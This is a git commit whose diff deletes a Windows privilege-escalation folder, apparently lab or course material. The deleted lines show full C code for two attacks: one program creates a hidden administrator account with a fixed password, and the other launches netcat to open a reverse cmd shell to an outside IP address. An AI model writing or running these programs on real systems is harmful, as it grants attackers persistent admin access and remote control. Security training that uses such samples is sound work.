50168aef83df9b4542f72e778338a91effcd6eec
MrLeek <37350087+MrLeek@users.noreply.github.com>
2026-05-06 19:12:10 +0100

    Delete 04.privilege_escalation directory

--- 04.privilege_escalation/windows/add_user_exe.c
+++
@@ -1,8 +0,0 @@
-#include <stdlib.h>
-
-int main ()
-{
-  system ("net user annette Password123 /add");
-  system ("net localgroup administrators annette /add");
-  return 0;
-}
--- 04.privilege_escalation/windows/nc_connect.c
+++
@@ -1,7 +0,0 @@
-#include <stdlib.h>
-
-int main ()
-{
-  system ("c:\\temp\\nc.exe 192.168.45.164 5556 -e cmd");
-  return 0;
-}
